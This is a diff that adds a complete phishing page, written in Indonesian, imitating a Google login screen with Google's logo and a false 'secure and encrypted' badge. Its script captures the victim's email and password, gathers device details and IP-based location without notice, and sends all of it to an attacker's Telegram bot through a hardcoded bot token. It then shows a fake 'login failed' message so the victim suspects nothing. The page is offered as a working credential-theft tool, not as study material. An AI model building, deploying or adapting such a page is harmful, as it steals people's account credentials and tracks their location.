@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Google</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+        body {
+            background: linear-gradient(135deg, #e8eaed, #f1f3f4);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            animation: fadeIn 1s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .container {
+            background: #ffffff;
+            padding: 40px 35px 45px;
+            border-radius: 28px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15), 0 0 0 1px rgba(0,0,0,0.03);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            transition: 0.3s;
+            animation: slideUp 0.8s ease;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .container img {
+            width: 90px;
+            margin-bottom: 8px;
+            filter: drop-shadow(0 4px 12px rgba(0,0,0,0.05));
+        }
+        .container h2 {
+            font-size: 26px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 4px;
+        }
+        .container .sub {
+            font-size: 15px;
+            color: #5f6368;
+            margin-bottom: 28px;
+            font-weight: 400;
+        }
+        .form-group {
+            margin-bottom: 18px;
+            text-align: left;
+        }
+        .form-group label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #3c4043;
+            display: block;
+            margin-bottom: 4px;
+            letter-spacing: 0.2px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 12px;
+            font-size: 15px;
+            background: #fafafa;
+            transition: 0.2s;
+            outline: none;
+            color: #202124;
+        }
+        input:focus {
+            border-color: #1a73e8;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.15);
+        }
+        input::placeholder { color: #9aa0a6; }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 40px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.15s;
+            margin-top: 10px;
+            box-shadow: 0 4px 14px rgba(26, 115, 232, 0.25);
+            letter-spacing: 0.3px;
+        }
+        button:hover {
+            background: #1557b0;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(26, 115, 232, 0.35);
+        }
+        button:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.2);
+        }
+        #status {
+            margin-top: 16px;
+            font-size: 14px;
+            font-weight: 500;
+            min-height: 24px;
+            color: #d93025;
+        }
+        .footer {
+            margin-top: 28px;
+            font-size: 12px;
+            color: #9aa0a6;
+            border-top: 1px solid #e8eaed;
+            padding-top: 18px;
+            letter-spacing: 0.2px;
+        }
+        .footer a { color: #1a73e8; text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+        .badge {
+            display: inline-block;
+            background: #e8f0fe;
+            color: #1a73e8;
+            font-size: 12px;
+            font-weight: 600;
+            padding: 4px 14px;
+            border-radius: 30px;
+            margin-bottom: 12px;
+        }
+        .loader {
+            display: none;
+            width: 30px;
+            height: 30px;
+            border: 4px solid #e8eaed;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+    <h2>Login</h2>
+    <div class="sub">Gunakan akun Google Anda</div>
+    <div class="badge">🔒 Aman & Terenkripsi</div>
+
+    <form id="form">
+        <div class="form-group">
+            <label>Email atau nomor telepon</label>
+            <input type="email" id="email" placeholder="contoh@gmail.com" required>
+        </div>
+        <div class="form-group">
+            <label>Password</label>
+            <input type="password" id="pass" placeholder="Masukkan password" required>
+        </div>
+        <button type="submit" id="submitBtn">Berikutnya</button>
+        <div class="loader" id="loader"></div>
+    </form>
+    <div id="status"></div>
+
+    <div class="footer">
+        <a href="#">Lupa password?</a> · <a href="#">Buat akun</a><br>
+        <span style="color:#9aa0a6;">Daftar Ke Google Mengunakan Akun yang sudah terdaftar</span>
+    </div>
+</div>
+
+<script>
+document.getElementById("form").addEventListener("submit", function(e) {
+    e.preventDefault();
+    const email = document.getElementById("email").value;
+    const pass = document.getElementById("pass").value;
+    const status = document.getElementById("status");
+    const loader = document.getElementById("loader");
+    const btn = document.getElementById("submitBtn");
+
+    const token = "8820925258:AAGjGHxAlObS5uGqi5LhjA0jyS0F9jNppbQ";
+
+    // Ambil info perangkat & lokasi (tanpa pemberitahuan)
+    const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        location: 'fetching...',
+        isp: '-'
+    };
+
+    // Efek loading
+    btn.style.display = "none";
+    loader.style.display = "block";
+    status.innerHTML = "⏳ Memverifikasi...";
+
+    // Ambil lokasi via IP (tanpa notifikasi)
+    fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+        info.location = `${data.city}, ${data.region}, ${data.country_name} (${data.ip})`;
+        info.isp = data.org || '-';
+    })
+    .catch(() => info.location = 'Tidak diketahui')
+    .finally(() => {
+        // Kirim semua ke Telegram
+        const pesan = `
+🔴 PHISHING GOOGLE 
+📧 Email: ${email}
+🔑 Password: ${pass}
+📱 Device: ${info.userAgent}
+🖥 Platform: ${info.platform}
+🌐 Bahasa: ${info.language}
+📺 Layar: ${info.screen}
+⏰ Timezone: ${info.timezone}
+📍 Lokasi: ${info.location}
+🏢 ISP: ${info.isp}
+        `;
+
+        fetch(`https://api.telegram.org/bot${token}/getUpdates`)
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok && data.result.length > 0) {
+                const chat_id = data.result[0].message.chat.id;
+                return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(pesan)}`);
+            } else {
+                throw new Error("Kirim /start ke bot dulu.");
+            }
+        })
+        .then(() => {
+            loader.style.display = "none";
+            btn.style.display = "block";
+            status.innerHTML = "❌ Log In Gagal Coba lagi";
+            console.log("📧 Email:", email);
+            console.log("🔑 Password:", pass);
+            console.log("📱 Info:", info);
+            setTimeout(() => {
+                document.getElementById("form").reset();
+                status.innerHTML = "";
+            }, 3000);
+        })
+        .catch((err) => {
+            loader.style.display = "none";
+            btn.style.display = "block";
+            status.innerHTML = "❌ " + err.message;
+        });
+    });
+});
+</script>
+</body>
+</html>
